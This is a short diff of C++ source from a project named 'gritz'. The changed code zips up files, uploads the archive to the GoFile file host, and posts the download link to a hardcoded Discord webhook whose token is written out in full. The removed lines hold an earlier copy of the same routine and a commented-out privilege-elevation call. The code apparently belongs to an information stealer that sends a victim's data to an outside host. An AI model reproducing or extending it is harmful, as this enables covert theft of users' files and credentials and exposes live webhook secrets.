@@ -4,10 +4,12 @@ void gritz::cGritz::Start(char** args)
 {
 	gritz::paths::initPaths();
 
-	//if (gritz::Elevation::elevate())
-	//{
-	//	std::cout << "hi";
-	//}
+	Webhook hook = Webhook("https://canary.discord.com/api/webhooks/1571868586195157013/-L9CPBnGtUkUujRNZQaawE6IkUEc_P1h9mYsoEEsB8tFUoUj4JuDi7EsRptCWXsz01");
+
+	hook.setUsername("yo")
+		.setContent(gritz::upload::GoFileUpload::upload(gritz::upload::zip::ZipFile::create("lmao")));
+
+	hook.execute();
 
 	//if (args[1] == nullptr)
 	//{
@@ -17,14 +19,4 @@ void gritz::cGritz::Start(char** args)
 	//}
 
 	//std::cin.get();
-
-	std::string url = gritz::upload::GoFileUpload::upload(gritz::upload::zip::ZipFile::create("lolz"));
-
-	
-	Webhook hook = Webhook("https://discord.com/api/webhooks/1502985859765502035/-Kp8RTjmK6hfyy3SbgmKQl6-cBhSs09hrs13KWDnkujXQR5pf-EfK8KewmvKvfeikwIl");
-
-	hook.setUsername("yo")
-		.setContent(url);
-
-	hook.execute();
 }
